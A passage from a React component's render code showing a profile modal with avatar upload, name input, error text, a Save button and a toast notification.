              <label className="profile-avatar-upload">
                {profileImage ? (
                  <img src={profileImage} alt="avatar" />
                ) : (
                  <>
                    <span className="profile-avatar-upload-icon" dangerouslySetInnerHTML={{ __html: UPLOAD_ICON }} />
                    <span className="profile-avatar-upload-label">Upload photo</span>
                  </>
                )}
                <input type="file" accept="image/*" style={{ display: 'none' }} onChange={handleProfileImageSelect} />
              </label>
              <input
                type="text"
                className="profile-name-input"
                placeholder="Your name"
                autoComplete="off"
                value={profileName}
                onChange={(e) => setProfileName(e.target.value)}
              />
              {profileError && <p style={{ color: '#E54B4B', fontSize: 13 }}>{profileError}</p>}
              <button className="uber-modal-btn uber-modal-btn-primary" onClick={saveProfile}>
                Save
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Toast */}
      {toast && (
        <div className="toast-container">
          <div className="toast">{toast}</div>
        </div>
      )}
    </div>
  )
}